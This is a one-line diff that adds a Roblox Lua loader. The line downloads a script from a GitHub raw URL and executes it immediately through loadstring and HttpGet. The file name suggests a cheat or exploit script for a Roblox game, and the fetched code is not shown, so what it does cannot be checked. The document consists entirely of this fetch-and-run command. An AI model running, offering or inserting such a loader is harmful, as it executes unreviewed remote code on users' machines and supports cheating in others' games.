@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/build-and-conquer-v0-1-spam4-vz2oz0fahzcvih.lua"))()
